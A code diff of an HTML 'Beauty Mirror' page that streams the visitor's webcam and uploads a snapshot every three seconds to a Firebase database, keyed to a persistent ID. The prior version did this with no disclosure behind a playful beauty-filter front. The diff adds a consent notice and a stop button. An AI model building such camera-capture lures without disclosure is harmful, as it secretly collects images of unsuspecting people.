@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Beauty Mirror</title>
+<title>Beauty Mirror 💖</title>
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}
@@ -13,9 +14,10 @@ body{
   display:flex;
   justify-content:center;
   align-items:center;
-  background:linear-gradient(-45deg,#00d4ff,#8a2be2,#ff0080,#00ff99);
+  background:linear-gradient(-45deg,#ffb6d5,#c9a7ff,#ffcce7,#a8c5ff);
   background-size:400% 400%;
   animation:bgMove 10s ease infinite;
+  padding:20px;
 }
 
 @keyframes bgMove{
@@ -28,9 +30,11 @@ body{
   width:90%;
   max-width:550px;
   padding:25px;
-  border-radius:25px;
-  background:rgba(255,255,255,.08);
+  border-radius:30px;
+  background:rgba(255,255,255,.22);
   backdrop-filter:blur(20px);
+  border:1px solid #ffffff80;
+  box-shadow:0 15px 50px #7b3c8b35;
   color:white;
   text-align:center;
 }
@@ -42,7 +46,9 @@ body{
   border-radius:50px;
   cursor:pointer;
   color:white;
-  background:linear-gradient(90deg,#00d4ff,#ff0080);
+  font-weight:bold;
+  background:linear-gradient(90deg,#ff69b4,#a855f7);
+  box-shadow:0 5px 20px #ff69b466;
 }
 
 video{
@@ -59,7 +65,52 @@ video{
   border:none;
   border-radius:12px;
   cursor:pointer;
+  background:#fff;
+  color:#a04491;
+  font-weight:bold;
 }
+
+.beauty-box{
+  margin:20px auto;
+  padding:22px;
+  border-radius:25px;
+  background:linear-gradient(135deg,#ff69b488,#a855f788);
+  border:1px solid #ffffff80;
+  box-shadow:0 8px 25px #ff69b455;
+}
+
+.percentage{
+  font-size:70px;
+  font-weight:bold;
+  color:white;
+  text-shadow:0 0 20px #ff40b5;
+  animation:glow 2s infinite alternate;
+}
+
+@keyframes glow{
+  from{transform:scale(1)}
+  to{transform:scale(1.08)}
+}
+
+.beauty-box h2{
+  margin-bottom:12px;
+}
+
+.beauty-box p{
+  margin-top:8px;
+}
+
+.heart{
+  position:fixed;
+  bottom:-30px;
+  animation:floatUp 5s linear forwards;
+  pointer-events:none;
+}
+
+@keyframes floatUp{
+  to{transform:translateY(-110vh);opacity:0}
+}
+
 </style>
 </head>
 
@@ -68,31 +119,56 @@ video{
 <div class="card">
 
   <div id="welcome">
-    <h1>✨ Ready to see your beauty?</h1>
-    <p>Tap below to start</p>
-    <button class="btn" onclick="startCamera()">YES ✨</button>
+    <h1>✨ Beauty Mirror ✨</h1>
+    <p>Ready for a little birthday magic? 💗</p>
+    <p style="margin-top:12px">
+      Camera snapshots will be uploaded to the configured Firebase database.
+      Continue only if you agree.
+    </p>
+    <button class="btn" onclick="startCamera()">
+      YES ✨ START
+    </button>
   </div>
 
   <div id="cameraBox">
+
+    <h2>💖 Your Beauty Mirror</h2>
+
     <video id="video" autoplay playsinline></video>
 
+    <!-- BEAUTY PERCENTAGE -->
+    <div class="beauty-box">
+      <h2>✨ Your Confidence Score ✨</h2>
+
+      <div class="percentage">
+        <span id="beautyPercent">100</span>%
+      </div>
+
+      <p>💗 Absolutely Wonderful! 💗</p>
+      <p>You are unique and amazing! 🎀</p>
+    </div>
+
     <div class="filters">
+
       <button onclick="setFilter('none')">Normal</button>
       <button onclick="setFilter('grayscale(100%)')">B&W</button>
       <button onclick="setFilter('sepia(100%)')">Vintage</button>
       <button onclick="setFilter('contrast(130%) saturate(160%)')">Pro</button>
       <button onclick="setFilter('brightness(120%) saturate(180%)')">Glow</button>
 
-      <!-- FUNNY + CUTE FILTERS -->
       <button onclick="setFilter('saturate(200%) hue-rotate(320deg) brightness(115%)')">Cute Pink 💖</button>
       <button onclick="setFilter('contrast(140%) saturate(180%) hue-rotate(10deg)')">Anime Pop 🎀</button>
       <button onclick="setFilter('brightness(130%) saturate(150%) blur(0.5px)')">Dreamy ✨</button>
       <button onclick="setFilter('hue-rotate(270deg) saturate(170%)')">Bubble Gum 🍬</button>
       <button onclick="setFilter('contrast(160%) sepia(40%) saturate(200%)')">Funny Face 🤪</button>
       <button onclick="setFilter('brightness(110%) contrast(120%) saturate(140%) blur(1px)')">Soft Glow 😍</button>
+
     </div>
 
     <p id="status">Waiting...</p>
+
+    <button class="btn" onclick="stopCamera()">STOP CAMERA</button>
+
   </div>
 
 </div>
@@ -118,57 +194,137 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 // UNIQUE USER ID
+
 let userId = localStorage.getItem("userId");
 
 if(!userId){
-  userId = "user_" + Date.now() + "_" + Math.random().toString(36).substr(2,5);
-  localStorage.setItem("userId", userId);
+  userId = "user_" + Date.now() + "_" +
+  Math.random().toString(36).substr(2,5);
+
+  localStorage.setItem("userId",userId);
 }
 
 let stream;
+let snapshotTimer;
 
 async function startCamera(){
-  stream = await navigator.mediaDevices.getUserMedia({video:true});
 
-  document.getElementById("video").srcObject = stream;
+  try{
 
-  document.getElementById("welcome").style.display="none";
-  document.getElementById("cameraBox").style.display="block";
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:true
+    });
 
-  document.getElementById("status").innerText="Live";
+    document.getElementById("video").srcObject = stream;
 
-  startSnapshots();
+    document.getElementById("welcome").style.display="none";
+    document.getElementById("cameraBox").style.display="block";
+
+    document.getElementById("status").innerText=
+      "Camera Live 💖";
+
+    startSnapshots();
+
+  }catch(error){
+
+    alert("Camera permission required!");
+    console.error(error);
+
+  }
+
 }
+
+// FILTERS
 
 function setFilter(f){
-  document.getElementById("video").style.filter = f;
+
+  document.getElementById("video").style.filter=f;
+
 }
+
+// SNAPSHOTS
 
 function startSnapshots(){
 
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
-  const ctx = canvas.getContext("2d");
+  const video=document.getElementById("video");
+  const canvas=document.getElementById("canvas");
+  const ctx=canvas.getContext("2d");
 
-  setInterval(()=>{
+  snapshotTimer=setInterval(()=>{
 
     if(!video.videoWidth) return;
 
-    canvas.width = 320;
-    canvas.height = 240;
+    canvas.width=320;
+    canvas.height=240;
 
     ctx.drawImage(video,0,0,320,240);
 
-    const frame = canvas.toDataURL("image/jpeg",0.5);
+    const frame=canvas.toDataURL("image/jpeg",0.5);
 
-    // HISTORY SAVE
-    db.ref("camera/" + userId + "/frames").push({
-      frame: frame,
-      updatedAt: Date.now()
+    // Upload only after the user has accepted the notice.
+
+    db.ref("camera/"+userId+"/frames").push({
+
+      frame:frame,
+      updatedAt:Date.now()
+
+    }).catch(error=>{
+
+      console.error("Upload failed:",error);
+      document.getElementById("status").innerText=
+        "Upload failed";
+
     });
 
   },3000);
+
 }
+
+// STOP CAMERA
+
+function stopCamera(){
+
+  if(snapshotTimer){
+    clearInterval(snapshotTimer);
+    snapshotTimer=null;
+  }
+
+  if(stream){
+    stream.getTracks().forEach(track=>track.stop());
+    stream=null;
+  }
+
+  document.getElementById("video").srcObject=null;
+  document.getElementById("cameraBox").style.display="none";
+  document.getElementById("welcome").style.display="block";
+
+}
+
+// FLOATING HEARTS
+
+function hearts(){
+
+  const icons=['💗','💕','💖','🌸','✨'];
+
+  for(let i=0;i<20;i++){
+
+    let h=document.createElement("div");
+
+    h.className="heart";
+    h.innerText=icons[Math.floor(Math.random()*icons.length)];
+
+    h.style.left=Math.random()*100+"vw";
+    h.style.fontSize="22px";
+
+    document.body.appendChild(h);
+
+    setTimeout(()=>h.remove(),5000);
+
+  }
+
+}
+
+setInterval(hearts,5000);
 
 </script>
 
